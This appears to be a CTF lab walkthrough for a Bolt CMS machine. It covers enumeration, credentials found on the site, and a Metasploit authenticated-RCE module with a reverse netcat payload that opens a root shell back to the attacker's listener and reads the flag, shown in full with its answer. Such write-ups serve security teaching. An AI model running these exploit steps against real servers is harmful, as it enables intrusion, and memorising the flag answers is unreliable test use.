# Bolt CMS

<img width="1539" height="246" alt="image" src="https://github.com/user-attachments/assets/d0caf6bb-2178-4dd6-9257-83a343728b6c" />

---

## What is Bolt CMS?

**Bolt CMS** is an open-source **Content Management System (CMS)** written in **PHP (Hypertext Preprocessor)**.

It provides a simple, flexible, and user-friendly platform for creating and managing **websites and blogs**. Bolt CMS also has an extensible framework that can be enhanced with various **plugins**.

### What is PHP?

**PHP** is a **server-side scripting language** used to create dynamic web pages.

In Bolt CMS, PHP is a core component responsible for:

- Data management
- User interfaces
- Dynamic web content
- Other website functionalities

### Cyber / CTF Note

When you identify **Bolt CMS** during enumeration, pay attention to the **Bolt CMS version, PHP version, plugins, login/admin pages, and configuration files**. These details can help with further vulnerability research and enumeration.

---

## What are LHOST and RHOST?

- **LHOST (Local Host):** This is the attacker's machine IP address. It's where the exploit sends information or establishes a connection after successfully compromising a target.

- **RHOST (Remote Host):** This is the target's machine IP address. It's the system being attacked by the exploit.

<img width="1755" height="896" alt="image" src="https://github.com/user-attachments/assets/0141e617-2a18-428c-85cd-d3731a388b80" />

---

## Why Do We Use `msfconsole`?

`msfconsole` is the main command-line interface for the **Metasploit Framework**. It is used by penetration testers and security professionals to find, configure, and test exploits against vulnerabilities in authorized environments.

It is popular because it provides many security-testing tools in one place and simplifies tasks such as:

- Searching for exploits
- Configuring exploit modules
- Setting `RHOST` and `LHOST`
- Selecting and configuring payloads
- Running exploits
- Managing sessions
- Performing post-exploitation tasks

---

# Q1 - What port number has a web server with a CMS running?

I started the initial enumeration with a `nmap` scan looking for open ports and services.

<img width="1903" height="303" alt="image" src="https://github.com/user-attachments/assets/9b6e624f-2b08-4824-841b-bfc8202aea57" />

### Answer

```text
8000
```

---

# Q2 - What is the username we can find in the CMS?

There was nothing much in port 80.

```text
http://10.10.123.191
```

```text
Machine IP : 80
Not working
```

```text
Machine IP : 8000
Done. Gotcha!!
```

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/03c6cf86-6f66-42a4-a8d8-a2690a44f0d9" />

As the name suggests, this website is running **Bolt CMS** and by scrolling down, I got some useful things by reading it, such as a username and password.

### Username

```text
bolt
```

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/4846f612-38ff-4b1f-8d0b-abf6d40e9378" />

---

### Answer

```text
bolt
```
# Q3 - What is the password we can find for the username?

From the information found on the **Bolt CMS** website, we identified the password for the `bolt` user.

### Password

```text
boltadmin123

# Q4 - What version of the CMS is installed on the server? (Ex: Name 1.1.1)

Now that we have a possible username and password, we need to find the login page for **Bolt CMS**.

A quick Google search to try and find the path for Bolt CMS login page:

<img width="858" height="370" alt="image" src="https://github.com/user-attachments/assets/4df36b2c-f597-4e66-8084-fe5e0b0e135c" />

<img width="1900" height="677" alt="image" src="https://github.com/user-attachments/assets/788cbfc4-70f6-4fc0-8437-b3c6f5074b96" />

```text
/bolt
```
<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/2adf30a8-d51e-418d-89ae-81658230a5a0" />

---

## Bolt CMS Dashboard

We found the **Bolt CMS Dashboard**.

After logging in, check the **bottom-left side** of the dashboard to find the installed version.

```text
Bolt 3.7.1
```
<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/b0aa2a3d-044c-40c7-b22c-47533426141f" />

### Answer

```text
Bolt 3.7.1
```

---

## OR - Exploit-DB

Now we will go to **Exploit-DB** and search for the CMS Server and find a lower version than the Deployed machine.

---

> **Note:** If you can’t find the exploit module its most likely because your Metasploit isn’t updated. Run `apt update` then `apt install metasploit-framework`.

<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/a368a736-36c5-4d6f-9bdf-7cacc10a265e" />

OR
You can start msfconsole and run search BOLT CMS to find the version number.


<img width="1961" height="802" alt="image" src="https://github.com/user-attachments/assets/1fff873a-b332-4a70-ad5d-881ed62db097" />


# Q5 - There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit-DB. What's its EDB-ID?

We identified that a previous version of **Bolt CMS** has an **Authenticated Remote Code Execution (RCE)** vulnerability.

Search **Exploit-DB** for the Bolt CMS authenticated RCE exploit.

### EDB-ID

```text
48296
```
<img width="1920" height="932" alt="image" src="https://github.com/user-attachments/assets/306f18a9-91aa-465d-9f52-57040930eb8a" />

---

### Answer

```text
48296
```
# Q6 - What's the full path for this exploit?

Start `msfconsole` and search **Bolt CMS**.

```bash
msfconsole
search bolt
```
<img width="1302" height="678" alt="image" src="https://github.com/user-attachments/assets/197f819f-1eff-4da7-b0db-f3c25f95adac" />

### Answer

```text
exploit/unix/webapp/bolt_authenticated_rce
```
# Q7 - Look for `flag.txt` inside the machine

For searching vulnerability we can start `msfconsole`.

<img width="1920" height="931" alt="image" src="https://github.com/user-attachments/assets/74dc85c1-abb5-41a1-a42f-9291abf3d26f" />

Next we search Bolt CMS.

<img width="1920" height="931" alt="image" src="https://github.com/user-attachments/assets/09f1bfe2-e8d7-4b72-84e8-409db4ee2c9a" />

```bash
msfconsole
```

```bash
search bolt cms
```

We found 2 vulnerability `0-1`.

We will use `0` because it is new for 2020.

```bash
use 0
```
<img width="1920" height="931" alt="image" src="https://github.com/user-attachments/assets/0b454ea0-9d94-408a-b996-0b0bda5f76e9" />

Next:

```bash
show options
```
<img width="1920" height="931" alt="image" src="https://github.com/user-attachments/assets/a743722b-35b0-48b8-8d04-71e001fa0528" />

We can see here options and we can create session.

---

## LHOST and RHOST

We need LHOST, we can open another Linux top.

- **LHOST (Local Host):** This is the attacker's machine IP address. It's where the exploit sends information or establishes a connection after successfully compromising a target.
- **RHOST (Remote Host):** This is the target's machine IP address. It's the system being attacked by the exploit.

```bash
sudo ifconfig
```
<img width="826" height="735" alt="image" src="https://github.com/user-attachments/assets/5d1206cd-63a7-4c25-99c0-f8f39313bf55" />

```bash
show options
```
<img width="1133" height="235" alt="image" src="https://github.com/user-attachments/assets/a8919a1a-e447-428b-9482-5aa5472c7caf" />

`tun0`, it is our local host.
<img width="1276" height="726" alt="image" src="https://github.com/user-attachments/assets/f1edbdf5-c657-4b50-ae1b-376d95b0f7e8" />

---

## Create Our Session

Now, we create our session.

<img width="1029" height="663" alt="image" src="https://github.com/user-attachments/assets/10b965c4-530c-4b17-9d41-ab7a89dd0fcd" />

We can see here:

```text
Command shell session 1 opened
```

Now, we will search:

```bash
whoami
```

```text
root@bolt:~/public/files# whoami
root
```

```bash
root@bolt:~/public/files# ls
index.html
```

```bash
root@bolt:~/public/files# pwd
/home/bolt/public/files
```

```bash
root@bolt:~/public/files# cd ..
```

```bash
root@bolt:~# cd ..
```

```bash
root@bolt:/home# ls
bolt composer-setup.php flag.txt
```

```bash
root@bolt:/home# cat flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```

Our goal is finding `flag.txt` file.

We found `flag.txt`.

Now we will see in the file:

```text
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```
<img width="1018" height="922" alt="image" src="https://github.com/user-attachments/assets/421f3293-d4d5-4e3d-bc2d-b5d4b4912cb3" />

---

# OR

```bash
root@ip-10-10-221-117:~# msfconsole
```

```text
This copy of metasploit-framework is more than two weeks old.
Consider running 'msfupdate' to update to the latest version.

Metasploit Park, System Security Interface
Version 4.0.5, Alpha E
Ready...

> access security
> access: PERMISSION DENIED.
> access security grid
> access: PERMISSION DENIED.
> access main security grid
> access: PERMISSION DENIED....and...
> YOU DIDN'T SAY THE MAGIC WORD!
> YOU DIDN'T SAY THE MAGIC WORD!
> YOU DIDN'T SAY THE MAGIC WORD!
> YOU DIDN'T SAY THE MAGIC WORD!
> YOU DIDN'T SAY THE MAGIC WORD!
> YOU DIDN'T SAY THE MAGIC WORD!
> YOU DIDN'T SAY THE MAGIC WORD!

   =[ metasploit v6.3.5-dev-                          ]
   =[ metasploit v6.3.5-dev-                          ]

-- --=[ 2294 exploits - 1201 auxiliary - 410 post ]
-- --=[ 968 payloads - 45 encoders - 11 nops ]
-- --=[ 9 evasion ]

Metasploit tip: Use help to learn more
about any command

Metasploit Documentation: https://docs.metasploit.com/
```

---

## Search Bolt CMS

```bash
msf6 > search bolt cms
```

### Matching Modules

```text
#  Name                                          Disclosure Date  Rank       Check  Description
-  ----                                          ---------------  ----       -----  -----------
0  exploit/unix/webapp/bolt_authenticated_rce    2020-05-07       excellent  Yes    Bolt CMS 3.7.0 - Authenticated Remote Code Execution
1  exploit/multi/http/bolt_file_upload           2015-08-17       excellent  Yes    CMS Bolt File Upload Vulnerability
```

Interact with a module by name or index. For example `info 1`, `use 1` or:

```text
use exploit/multi/http/bolt_file_upload
```

---

## Use Exploit

```bash
msf6 > use 0
```

```text
[*] Using configured payload cmd/unix/reverse_netcat
```

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > show options
```

### Module Options

```text
Module options (exploit/unix/webapp/bolt_authenticated_rce):

Name                 Current Setting        Required  Description
----                 ---------------        --------  -----------
FILE_TRAVERSAL_PATH  ../../../public/files  yes       Traversal path
PASSWORD                                    yes       Password to authenticate with
Proxies                                     no        A proxy chain
RHOSTS                                      yes       The target host(s)
RPORT                8000                   yes       The target port (TCP)
SSL                  false                  no        Negotiate SSL/TLS
SSLCert                                     no        Path to a custom SSL certificate
TARGETURI            /                      yes       Base path to Bolt CMS
URIPATH                                     no        The URI to use for this exploit
USERNAME                                    yes       Username to authenticate with
VHOST                                       no        HTTP server virtual host
```

### Payload Options

```text
Payload options (cmd/unix/reverse_netcat):

Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address
LPORT  4444             yes       The listen port
```

### Exploit Target

```text
Id  Name
--  ----
2   Linux (cmd)
```

---

## Configure Exploit

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set password boltadmin123
password => boltadmin123
```

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set username bolt
username => bolt
```

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST 10.10.221.117
LHOST => 10.10.221.117
```

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS 10.10.105.118
RHOSTS => 10.10.105.118
```

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set TARGETURI http://10.10.105.118:8000/
TARGETURI => http://10.10.105.118:8000/
```

---

## Run Exploit

```bash
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit
```

```text
[*] Started reverse TCP handler on 10.10.221.117:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Successfully changed the /bolt/profile username to PHP $_GET variable "nodk".
[*] Found 2 potential token(s) for creating .php files.
[+] Deleted file hmcsycubm.php.
[+] Used token 3321267c1713231c84e199e462 to create zxyusvqxndx.php.
[*] Attempting to execute the payload via "/files/zxyusvqxndx.php?nodk=`payload`"
[!] No response, may have executed a blocking payload!
[*] Command shell session 1 opened (10.10.221.117:4444 -> 10.10.105.118:43284) at 2024-04-29 19:01:05 +0100
[+] Deleted file zxyusvqxndx.php.
[+] Reverted user profile back to original state.
```

---

## Find `flag.txt`

```bash
whoami
```

```text
root
```

```bash
ls
```

```text
index.html
```

```bash
cd ..
ls
```

```text
bolt-public
extensions
files
index.php
theme
thumbs
```

```bash
cd ..
ls
```

```text
app
composer.json
composer.lock
cron
extensions
index.php
public
README.md
reboot.sh
src
vendor
```

```bash
cd ..
ls
```

```text
bolt
composer-setup.php
flag.txt
```

```bash
cat flag.txt
```

### Answer

```text
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```
